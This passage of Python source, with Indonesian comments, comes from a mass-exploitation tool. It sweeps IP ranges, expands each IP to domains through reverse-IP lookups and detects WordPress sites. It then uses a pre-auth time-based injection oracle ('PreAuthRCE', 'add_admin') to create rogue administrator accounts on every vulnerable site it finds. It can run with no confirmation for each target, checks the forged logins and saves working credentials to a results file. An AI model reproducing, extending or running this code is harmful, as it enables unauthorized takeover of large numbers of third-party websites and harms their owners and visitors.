        input("Press Enter to start ...")

        get_watchdog().activate()
        from forge_admin_v2 import add_admin, try_login, C, PreAuthRCE
        from concurrent.futures import ThreadPoolExecutor, as_completed as fa_as_completed

        if is_file_mode:
            # ============================================================
            # OPSI 2 (File mode) — jalur shared _forge_single_url:
            #   pre-filter detect() -> hanya VULN yang ditampilkan & di-forge
            #   hasil disimpan ke forge_results/suc.txt & faillog.txt
            # ============================================================
            _forge_results_ensure()

            forge_lock = threading.Lock()
            counters = {"attempt": 0, "ok": 0, "fail": 0, "wp": 0, "not_vuln": 0}

            def _file_worker(u):
                _forge_single_url(
                    u,
                    sleep_s=sleep_s, delay_s=delay,
                    user_in=user_in, pass_in=pass_in, prefix_in=prefix_in,
                    do_verify=do_verify, auto_forge=None,  # None = no prompt
                    ip=None,
                    counters=counters, forge_lock=forge_lock,
                    fa=fa,
                )

            with ThreadPoolExecutor(max_workers=jobs) as ex:
                futs = [ex.submit(_file_worker, u) for u in urls]
                for f in futs:
                    try:
                        f.result(timeout=600)
                    except Exception as e:
                        print(f"[-] worker error: {e}")

            print("\n" + "=" * 60)
            print(f"FORGE ADMIN SELESAI: {counters['ok']} sukses, "
                  f"{counters['fail']} gagal, "
                  f"{counters['not_vuln']} not-vuln (silent)")
            print(f"[*] Hasil disimpan ke: {FORGE_SUC_FILE} / {FORGE_FAIL_FILE}")
            print("=" * 60)
            return

        # ============================================================
        # OPSI 1 (Single URL) — jalur lama, verbose, tanpa pre-filter
        # ============================================================
        results = []
        lock = threading.Lock()

        def _worker(u):
            get_watchdog().tick(f"forge_opt1:add_admin:{u}")
            try:
                r = add_admin(
                    u,
                    username=user_in,
                    password=pass_in,
                    delay=delay,
                    sleep=sleep_s,
                    force_prefix=prefix_in,
                )
                get_watchdog().tick(f"forge_opt1:done:{u}")
                return {"url": u, "ok": True, "result": r}
            except Exception as e:
                get_watchdog().tick(f"forge_opt1:err:{u}")
                return {"url": u, "ok": False, "error": str(e)[:200]}

        with ThreadPoolExecutor(max_workers=jobs) as ex:
            futures = {ex.submit(_worker, u): u for u in urls}
            for fut in fa_as_completed(futures):
                res = fut.result()
                with lock:
                    results.append(res)
                    if res["ok"]:
                        r = res["result"]
                        print(f"\n[✓] {res['url']} → admin={r[0]} pass={r[1]} email={r[2]}")
                        if do_verify:
                            try:
                                v = try_login(res['url'].rstrip('/'), r[0], r[1])
                                print(f"[✓] verify login: {v}")
                            except Exception as ve:
                                print(f"[!] verify login error: {ve}")
                    else:
                        print(f"\n[✗] {res['url']} → {res['error']}")

        print("\n" + "="*60)
        ok  = sum(1 for r in results if r["ok"])
        fail= len(results) - ok
        print(f"FORGE ADMIN SELESAI: {ok} sukses, {fail} gagal")
        print("="*60)

    # ==================================================================
    # Opsi 6 sub-mode 3: FORGE CONTINUOUS MODE (ala opsi 3/5)
    # Level 1 full -> Level 2 explore -> sampling -> exploit full.
    # Per IP: reverse IP (Hackertarget) -> domain -> cek WP cepat
    # -> forge admin via add_admin (forge_admin_v2).
    # ==================================================================
    def forge_continuous_mode(self):
        """Continuous forge admin: loop IP seperti opsi 5, exploit = forge admin."""
        import ssl as _ssl
        import urllib.request as _urllib
        import threading
        from concurrent.futures import ThreadPoolExecutor, as_completed
        import forge_admin_v2 as fa

        FORGE_OUT_DIR = "forge_results"
        FORGE_SUC_FILE  = os.path.join(FORGE_OUT_DIR, "suc.txt")
        FORGE_FAIL_FILE = os.path.join(FORGE_OUT_DIR, "faillog.txt")

        print("\n" + "="*60)
        print("FORGE CONTINUOUS MODE (scan IP + auto-forge WP admin)")
        print("="*60)
        print("[*] Alur: Reverse IP -> Domain -> Cek WP -> Forge Admin (PreAuthRCE)")
        print("[*] Level 1: Scan semua 254 IP dari 3 oktet base")
        print("[*] Level 2 Explore: Cari base baru (acak X dan Y)")
        print(f"[*] Level 2 Sampling: {Config.SAMPLE_SIZE} IP VALID per base")
        print(f"[*] Level 2 Exploit: Forge di semua domain WP base yang lolos")
        print(f"[*] Lolos vuln + uji login OK  -> {FORGE_SUC_FILE}")
        print(f"[*] Forge OK tapi gagal login -> {FORGE_FAIL_FILE}")
        print("[*] Yang FAIL / tidak vuln : tidak di-save")
        print("[*] Press Ctrl+C to stop")
        print()

        base_input = input("Base IP untuk Level 1 (3 oktet, e.g., 157.7.44): ").strip()
        if base_input.count('.') != 2:
            print("[!] Please enter 3 octets (e.g., 157.7.44)")
            return

        user_in     = input("Username (kosong = random w2s_xxx per target): ").strip() or None
        pass_in     = input("Password  (kosong = random strong per target): ").strip() or None
        delay_in    = input("Oracle unit sleep [0.15]: ").strip() or "0.15"
        sleep_in    = input("SLEEP detect sec  [4]: ").strip() or "4"
        jobs_in     = input("Threads per IP   [5]: ").strip() or "5"
        prefix_in   = input("WP table prefix (kosong = auto-detect): ").strip() or None
        auto_in     = input("Auto-forge tanpa konfirmasi per target? (Y/n) [y]: ").strip().lower()
        auto_forge  = auto_in != "n"
        verify_in   = input("Verify login setelah forge? (y/N) [n]: ").strip().lower() == "y"

        delay_s = float(delay_in); sleep_s = float(sleep_in); jobs = int(jobs_in)

        print()
        print(f"[*] Jobs: {jobs} | Delay: {delay_s}s | Sleep: {sleep_s}s | Auto-forge: {auto_forge} | Verify: {verify_in}")
        input("Press Enter to start ...")

        get_watchdog().activate()
        os.makedirs(FORGE_OUT_DIR, exist_ok=True)
        forge_lock = threading.Lock()
        forged_set = set()          # domain yang sudah di-process (in-memory)
        counters = {"attempt": 0, "ok": 0, "fail": 0, "wp": 0}

        # ---- helper: cek cepat apakah domain itu WordPress ----
        # Per keputusan oxz (revisi final):
        # 1) PRIORITAS: cek header HTTP dari 1 request index (https://domain/)
        #    — kalau ada "wp-json" / "api.w.org" di header (Link: .../wp-json/),
        #    langsung lolos TANPA download body. Terbukti dari sampel nyata:
        #    9/9 target (termasuk hasil_failed.txt & kawaishi-syoten.jp) membocorkan
        #    sinyal ini di header.
        # 2) FALLBACK: jika header tidak membocorkan wp-json, fetch 16KB body
        #    index & cek "wp-content"/"wp-includes" (robust terhadap WAF/CDN yang
        #    strip header Link-nya).
        # 3) Urutan skema tetap: https non-www -> https www -> http non-www -> http
        #    www; stop begitu ketemu. Tidak ada cek /wp-login.php.
        def _looks_like_wordpress(domain, timeout=12):
            import urllib.request as _u_req
            import urllib.error as _u_err
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            opener = _u_req.build_opener(_u_req.HTTPSHandler(context=ctx),
                                          _u_req.HTTPHandler(),
                                          _u_req.ProxyHandler({}))

            def _check_wp_signals(headers, body):
                # headers: dict str->str. Cek header dulu (murah, tanpa body)
                hl = " ".join(v for v in headers.values()).lower() if headers else ""
                if "wp-json" in hl or "api.w.org" in hl:
                    return True
                # Fallback: cek body
                return ("wp-content" in body) or ("wp-includes" in body)

            for base in (f"https://{domain}", f"https://www.{domain}",
                         f"http://{domain}", f"http://www.{domain}"):
                try:
                    with opener.open(_u_req.Request(base + "/",
                            headers={"User-Agent": "Mozilla/5.0", "Accept-Language": "en"}),
                            timeout=timeout) as resp:
                        hdrs = dict(resp.headers)
                        if _check_wp_signals(hdrs, ""):
                            return base.rstrip("/")
                        body = resp.read(16384).decode(errors="replace").lower()
                        if _check_wp_signals(hdrs, body):
                            return base.rstrip("/")
                except _u_err.HTTPError as e:
                    hdrs = dict(e.headers) if e.headers else {}
                    body = (e.read(8192) if e.headers and e.headers.get('Content-Type', '').startswith('text') else b'').decode(errors="replace").lower()
                    if _check_wp_signals(hdrs, body):
                        return base.rstrip("/")
                except Exception:
                    continue
            return None

        # ---- helper: forge satu domain ----
        def _forge_domain(domain, ip):
            # Dedup & resolve tetap lokal di Opsi 5 (sama seperti kode lama):
            # dedup by domain SEBELUM HTTP, lalu _looks_like_wordpress.
            with forge_lock:
                if domain in forged_set:
                    return
                forged_set.add(domain)

            self.scanner._watchdog.tick(f"forge_domain:start:{ip}:{domain}")
            url = _looks_like_wordpress(domain)
            self.scanner._watchdog.tick(f"forge_domain:wp_check_done:{ip}:{domain}")
            if not url:
                self.scanner._watchdog.tick(f"forge_domain:not_wp:{ip}:{domain}")
                return

            # Jalur shared: pre-filter detect -> forge -> save (dedup & resolve
            # sudah selesai di sini, jadi forged_set=None, not_vuln counter = "fail")
            _forge_single_url(
                url,
                sleep_s=sleep_s, delay_s=delay_s,
                user_in=user_in, pass_in=pass_in, prefix_in=prefix_in,
                do_verify=verify_in,
                auto_forge=auto_forge,
                ip=ip,
                counters=counters,
                forge_lock=forge_lock,
                fa=fa,
                not_vuln_counter_key="fail",
            )
            self.scanner._watchdog.tick(f"forge_domain:done:{ip}:{domain}")

        # ---- proses satu IP: reverse -> domains -> forge (threaded per IP) ----
        def _process_ip_forge(ip):
            if self.cache_manager.is_ip_processed(ip):
                print(f"[↺] Skipping cached IP: {ip}")
                return

            print(f"\n[*] Processing IP {ip} (reverse -> WP check -> forge)")
            self.scanner._watchdog.tick(f"forge_ip:start:{ip}")
            try:
                domains_ht = self.scanner.reverse_ip_hackertarget(ip) or []
                self.scanner._watchdog.tick(f"forge_ip:got_domains:{ip}:{len(domains_ht or [])}")
            except Exception as e:
                print(f"[-] Hackertarget reverse error: {e}")
                self.scanner._watchdog.tick(f"forge_ip:reverse_error:{ip}")
                domains_ht = []

            all_domains = sorted(set(domains_ht))
            if not all_domains:
                print(f"[-] No domains for IP {ip}")
                self.cache_manager.mark_ip_processed(ip, "forge_no_domains")
                return

            print(f"[+] {len(all_domains)} domain(s) untuk {ip}")
            with ThreadPoolExecutor(max_workers=jobs) as ex:
                futs = [ex.submit(_forge_domain, d, ip) for d in all_domains]
                # [BUG-3 FIX] Hapus timeout=600 dari f.result().
                # as_completed + f.result(timeout=N) melempar TimeoutError dari
                # for-statement itu sendiri (di luar try/except) jika ada 1
                # domain lambat → crash "N futures unfinished".
                # Per-request timeout di _looks_like_wordpress (12s) + forge (60s)
                # sudah cukup membatasi durasi masing-masing domain.
                for f in as_completed(futs):
                    try:
                        f.result()
                        self.scanner._watchdog.tick(f"forge_ip:domain_done:{ip}")
                    except Exception as e:
                        print(f"[-] forge worker error: {e}")
                        self.scanner._watchdog.tick(f"forge_ip:worker_error:{ip}")
                self.scanner._watchdog.tick(f"forge_ip:done:{ip}")
            get_watchdog().tick(f"forge_ip:all_done:{ip}")
            self.cache_manager.mark_ip_processed(ip, "forge_done")

        # ================= LOOP CONTINUOUS (struktur = opsi 5) =================
        base_level1 = base_input + ".1"
        # [BUG-1 FIX] rsplit(".", 1)[0] menghasilkan "157.7" (tanpa titik akhir).
        # generate_ips_level2_explore() mengharapkan format "157.7." (dengan titik),
        # konsisten dengan scan_mode di baris 585 yang pakai rfind+slicing.
        base_two_octets = base_input[:base_input.rfind(".")] + "."

        self.scan_level = 1
        self.scan_phase = None
        self.current_base_three_octets = None
        self.skip_counter = 0
        # [BUG-2 FIX] explored_bases untuk blacklist base yang sudah diproses.
        # Tanpa ini base yang sama bisa di-explore dan di-exploit berulang kali.
        _forge_explored_bases = set()

        while self.running:
            # ========== LEVEL 1 ==========
            if self.scan_level == 1:
                print(f"\n{'='*60}")
                print(f"[LEVEL 1] FORGE CONTINUOUS: {base_input}.x")
                print(f"{'='*60}")
                print(f"[*] LEVEL 1: Scanning ALL 254 IPs from {base_input}.[1-254]...")
 
                forged_this_base = 0
                for ip in self.ip_generator.generate_ips_level1_full(base_level1):
                    if not self.running:
                        break

                    if self.cache_manager.is_ip_processed(ip):
                        # SKIP - IP sudah pernah diproses
                        self.skip_counter += 1
                        self.update_status_bar_forge()

                        # Jika skip mencapai 500 tanpa nemu IP baru, reset dan lanjut cari
                        if self.skip_counter >= 500:
                            print(f"\n[!] L1 skip counter 500, reset...")
                            self.skip_counter = 0
                            break
                    else:
                        self.total_ips_processed += 1
                        try:
                            _process_ip_forge(ip)
                        except Exception as e:
                            print(f"[!] process_ip_forge error ({ip}): {e}", flush=True)
                        if counters["ok"] > forged_this_base:
                            forged_this_base = counters["ok"]
                        self.update_status_bar_forge()
                        time.sleep(1)

                print(f"\n[!] LEVEL 1 COMPLETED. Moving to LEVEL 2 EXPLORE...")
                self.scan_level = 2
                self.scan_phase = "explore"
                self.current_base_three_octets = None
                # [BUG-4 FIX] Reset skip_counter saat transisi L1 → L2.
                # Tanpa ini skip_counter dari L1 terbawa ke L2 explore dan
                # langsung break pada 500 skip pertama di L2.
                self.skip_counter = 0
                time.sleep(2)

            # ========== LEVEL 2 EXPLORE ==========
            elif self.scan_level == 2 and self.scan_phase == "explore":
                print(f"\n{'='*60}")
                print(f"[LEVEL 2 EXPLORE] Mencari base baru dari {base_two_octets}x.y")
                print(f"{'='*60}")

                found_base = False
                for ip in self.ip_generator.generate_ips_level2_explore(base_two_octets, Config.MAX_VALID_RNG):
                    if not self.running:
                        break

                    if self.cache_manager.is_ip_processed(ip):
                        # SKIP - IP sudah pernah diproses
                        self.skip_counter += 1
                        self.update_status_bar_forge()

                        # Jika skip mencapai 500 tanpa nemu IP baru, reset dan lanjut cari
                        if self.skip_counter >= 500:
                            print(f"\n[!] Skip counter reached 500 without new IP in Explore mode!")
                            print(f"[!] Resetting and continuing search...")
                            self.skip_counter = 0
                            break
                        continue

                    else:
                        # IP BARU VALID DITEMUKAN!
                        # [BUG-2 & BUG-5 FIX] Cek blacklist base sebelum proses.
                        # Tanpa ini base yang sama bisa di-explore → sampling →
                        # exploit berulang kali karena tidak ada mekanisme blacklist
                        # di forge_continuous_mode (berbeda dengan scan_mode yang
                        # sudah punya explored_bases).
                        ip_parts_check = ip.split('.')
                        if len(ip_parts_check) == 4:
                            candidate_base = '.'.join(ip_parts_check[:3]) + '.'
                            if candidate_base in _forge_explored_bases:
                                self.skip_counter += 1
                                self.update_status_bar_forge()
                                if self.skip_counter >= 500:
                                    print(f"\n[!] Skip 500 (semua base blacklisted) — rotasi ulang")
                                    self.skip_counter = 0
                                    break
                                continue

                        found_base = True
                        self.total_ips_processed += 1
                        self.scanner._watchdog.tick(f"forge_explore:{ip}")

                        # Reverse IP via scanner
                        try:
                            domains_ht = self.scanner.reverse_ip_hackertarget(ip) or []
                            self.scanner._watchdog.tick(f"forge_explore:got_domains:{ip}:{len(domains_ht or [])}")
                        except Exception:
                            self.scanner._watchdog.tick(f"forge_explore:reverse_error:{ip}")
                            domains_ht = []
                        all_domains = list(set(domains_ht))

                        # Ekstrak 3 oktet dari IP yang ditemukan
                        ip_parts = ip.split('.')
                        if len(ip_parts) == 4:
                            new_base = '.'.join(ip_parts[:3]) + '.'
                            print(f"\n{'*'*60}")
                            print(f"[✓] FOUND NEW BASE IN EXPLORE MODE!")
                            print(f"[✓] IP: {ip}")
                            print(f"[✓] New base 3 oktet: {new_base}")
                            print(f"[✓] Moving to SAMPLING phase...")
                            print(f"{'*'*60}\n")

                            # Pindah ke sampling phase
                            self.scan_phase = "sampling"
                            self.current_base_three_octets = new_base
                            self.skip_counter = 0
                            self.cache_manager.mark_ip_processed(ip, "explore_hit")
                            break

                if not found_base and self.running and self.scan_phase == "explore":
                    print(f"\n[*] No new base found in this explore cycle")
                    print(f"[*] Continuing explore mode...")
                    time.sleep(5)

            # ========== LEVEL 2 SAMPLING ==========
            elif self.scan_level == 2 and self.scan_phase == "sampling":
                print(f"\n{'='*60}")
                print(f"[LEVEL 2 SAMPLING] Base: {self.current_base_three_octets}x")
                print(f"[*] Will test {Config.SAMPLE_SIZE} valid IPs from this base")
                print(f"[*] Qualifies if >=1 sample has >= {Config.MIN_DOMAINS_PER_IP} domains")
                print(f"{'='*60}")

                is_good, sampled_ips, domain_counts, good_ip = self.sample_base_quality(
                    self.current_base_three_octets
                )

                # Tandai sample IP sebagai processed
                for ip in sampled_ips:
                    if not self.cache_manager.is_ip_processed(ip):
                        status = 'sampled_good' if domain_counts.get(ip, 0) >= Config.MIN_DOMAINS_PER_IP else 'sampled_bad'
                        self.cache_manager.mark_ip_processed(ip, status)

                if not is_good:
                    print(f"[!] Base {self.current_base_three_octets}x rejected (no IP met criteria)")
                    print(f"[!] Returning to EXPLORE mode for new base...")
                    self.scan_phase = 'explore'
                    self.current_base_three_octets = None
                    time.sleep(2)
                    continue

                print(f"\n[✓] Base {self.current_base_three_octets}x QUALIFIED!")
                print(f"[✓] Best sample: {good_ip} with {domain_counts.get(good_ip, 0)} domains")
                print(f"[✓] Proceeding to FORGE EXPLOIT...")

                self.scan_phase = 'exploit'
                time.sleep(2)

            # ========== LEVEL 2 EXPLOIT (FORGE) ==========
            elif self.scan_level == 2 and self.scan_phase == "exploit":
                print(f"\n{'='*60}")
                print(f"[LEVEL 2 FORGE EXPLOIT] Scanning ALL 254 IP from {self.current_base_three_octets}x")
                print(f"{'='*60}")

                for ip in self.ip_generator.generate_ips_level2_exploit_full(self.current_base_three_octets):
                    if not self.running:
                        break

                    if self.cache_manager.is_ip_processed(ip):
                        self.skip_counter += 1
                        self.update_status_bar_forge()
                        if self.skip_counter >= 500:
                            print(f"\n[!] Skip counter 500, resetting...")
                            self.skip_counter = 0
                            break
                    else:
                        self.total_ips_processed += 1
                        try:
                            _process_ip_forge(ip)
                        except Exception as e:
                            print(f"[!] process_ip_forge error ({ip}): {e}", flush=True)
                        self.update_status_bar_forge()

                print(f"\n\n{'!'*60}")
                print(f"[!] FORGE EXPLOIT COMPLETED!")
                print(f"[!] Base: {self.current_base_three_octets}x")
                print(f"[!] Total Forge OK: {counters['ok']}")
                print(f"[!] Switching back to EXPLORE...")
                print(f"{'!'*60}\n")

                # [BUG-2 & BUG-5 FIX] Tandai base ini sudah selesai di-exploit
                # agar tidak di-explore dan di-exploit ulang di cycle berikutnya.
                if self.current_base_three_octets:
                    _forge_explored_bases.add(self.current_base_three_octets)

                self.scan_phase = "explore"
                self.current_base_three_octets = None
                self.skip_counter = 0
                time.sleep(2)

            # Status periodik
            if self.running:
                print(f"\n[#] FORGE STATUS: IP={self.total_ips_processed} | WP={counters['wp']} | "
                      f"Forge attempt={counters['attempt']} | OK={counters['ok']} | FAIL={counters['fail']} | "
                      f"Mode={'L1' if self.scan_level == 1 else 'L2-' + str(self.scan_phase)}")
                self.update_status_bar_forge()

        # ---- ringkasan akhir (setelah Ctrl+C) ----
        print("\n" + "="*60)
        print(f"FORGE CONTINUOUS MODE BERHENTI. OK={counters['ok']} FAIL={counters['fail']} WP_found={counters['wp']}")
        print(f"SUKSES (vuln + login OK): {FORGE_SUC_FILE}")
        print(f"FORGE OK tapi login gagal: {FORGE_FAIL_FILE}")
        print("="*60)

    def show_stats(self, quiet=False):
        """Tampilkan statistik"""
        if not quiet:
            print("\n" + "="*60)
            print("SYSTEM STATISTICS")
            print("="*60)
        
        cache_stats = self.cache_manager.get_stats()
        print(f"\n📦 Cache Database:")
        for table, count in cache_stats.items():
            if isinstance(count, (int, float)):
                print(f"  - {table}: {count}")
        
        self.proxy_manager.print_stats()
        
        print("\n📁 Output Files:")
        for name, filename in Config.OUTPUT_FILES.items():
            if os.path.exists(filename):
                size = os.path.getsize(filename) / 1024
                print(f"  - {filename}: {size:.2f} KB")
            elif os.path.exists(Config.TEMP_DIR + filename):
                size = os.path.getsize(Config.TEMP_DIR + filename) / 1024
                print(f"  - {filename} (temp): {size:.2f} KB")


def main():
    scanner = MovableTypeMassScanner()
    scanner.run()

if __name__ == "__main__":
    main()